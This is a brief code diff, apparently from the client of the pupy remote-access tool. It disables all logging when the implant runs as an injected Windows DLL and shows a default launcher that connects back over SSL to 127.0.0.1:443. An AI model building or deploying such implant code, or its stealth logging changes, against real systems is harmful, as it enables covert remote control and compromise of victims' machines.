@@ -48,7 +48,11 @@ except ImportError:
     pass
 except Exception as e:
     logging.warning(e)
-logging.getLogger().setLevel(logging.ERROR)
+
+if sys.platform=="win32" and hasattr(sys, 'frozen') and sys.frozen:
+    logging.disable(logging.CRITICAL) # disable all logging, because it can injected pupy dll unresponsive
+else:
+    logging.getLogger().setLevel(logging.ERROR)
 
 LAUNCHER="connect" # the default launcher to start when no argv
 LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
